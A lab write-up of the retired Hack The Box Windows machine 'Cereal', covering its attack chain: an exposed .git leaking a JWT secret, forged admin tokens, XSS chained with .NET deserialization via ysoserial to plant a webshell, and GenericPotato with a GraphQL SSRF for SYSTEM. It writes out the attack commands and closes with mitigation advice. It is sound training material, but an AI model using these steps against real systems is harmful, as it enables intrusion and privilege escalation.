---
machine: Cereal
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, jwt, deserialization, seimpersonate, graphql]
---

# Cereal — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

An exposed `.git` reveals the JWT secret and allows forging an admin token. The authenticated form chains XSS with .NET deserialization to upload a webshell; the user holds `SeImpersonate`, and a local GraphQL SSRF enables GenericPotato for SYSTEM.

## Recon

```bash
nmap -Pn -sCV -p22,80,5985 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP and `5985/tcp` WinRM.
- Services: C#/.NET application with a React frontend, exposed Git repository and GraphQL backend.
- Technologies: .NET, React, JWT, YSoSerial.NET, SeImpersonate and GraphQL.

## Enumeration

- `cereal.htb` with a cereal-flavor request app.
- `.git` reachable from the web root.
- JWT authentication code and an admin form.
- GraphQL listening on localhost.

## Foothold

Dump the repository, find the JWT key and sign a token with the admin role. The vulnerable form reflects HTML and processes .NET objects; chain XSS with a YSoSerial payload to write a webshell.

```bash
git-dumper http://cereal.htb/.git src
grep -RniE "jwt|secret|key" src
jwt_tool <TOKEN> -S hs256 -p "<SECRET>"
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o payload.txt
# Submit the payload through the vulnerable field and request the webshell.
```

## Lateral movement

The initial shell reveals the first user password for SSH; the next move is to the local GraphQL service.

## Privilege escalation

`whoami /priv` shows `SeImpersonateEnabled`. GenericPotato starts a fake HTTP server and is reached through the GraphQL SSRF to capture and impersonate SYSTEM.

```bash
whoami /priv
GenericPotato.exe -l 8080 -p 80 -e "C:\\Windows\\Temp\\shell.exe"
# Trigger the GraphQL SSRF toward 127.0.0.1:8080
```

## Evidence

- Exposed `.git` and JWT secret in source.
- Admin token accepted by the application.
- `SeImpersonate` and SYSTEM shell.

## Lessons learned

- An exposed repository leaks both code and signing secrets.
- .NET deserialization yields execution when the type is controlled.
- `SeImpersonate` needs a local authenticating service to exploit it.

## Mitigation and detection

- Do not expose `.git` and rotate the JWT secret.
- Avoid deserializing untrusted types and use allowlists.
- Remove `SeImpersonate` from service accounts and restrict GraphQL to localhost.

## References

- [0xdf — Cereal](https://0xdf.gitlab.io/2021/05/29/htb-cereal.html)
- [IppSec — Cereal](https://www.youtube.com/watch?v=04ZBIioD5pA)
- [Hack The Box — Cereal](https://app.hackthebox.com/machines/cereal)
